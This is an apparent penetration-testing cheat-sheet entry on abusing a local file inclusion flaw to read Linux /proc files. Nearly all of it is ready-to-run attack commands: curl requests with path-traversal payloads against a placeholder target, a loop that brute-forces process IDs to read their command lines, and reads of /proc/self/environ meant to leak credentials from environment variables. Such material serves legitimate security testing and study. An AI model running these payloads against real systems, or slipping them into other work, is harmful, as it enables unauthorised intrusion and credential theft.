# LFI via /proc — Listening Port + Process Enumeration

When an LFI allows reading `/proc`, enumerate listening ports and running processes to discover hidden services.

```bash
# Read /proc/net/tcp (hex port, local_address)
curl -s 'http://<TARGET>/page?file=../../../../proc/net/tcp'
# Format: sl local_addr:hex_port remote_addr:hex_port st
# 0100007F:1BB6 → 127.0.0.1:7094 (convert: 0x1BB6=7094)
python3 -c "print(int('1BB6',16))"  # → 7094

# Enumerate running process cmdlines via /proc/<PID>/cmdline
# (brute-force PID range via LFI)
for i in $(seq 1 1000); do
  curl -s "http://<TARGET>/page?file=../../../../proc/$i/cmdline" -o - 2>/dev/null | tr '\0' ' ' | grep -v "^$"
done

# /proc/<PID>/exe symlink → reveals binary path
curl -s 'http://<TARGET>/page?file=../../../../proc/self/exe'
# /proc/self/environ → leaked environment variables (creds, paths)
curl -s 'http://<TARGET>/page?file=../../../../proc/self/environ' | tr '\0' '\n'
```
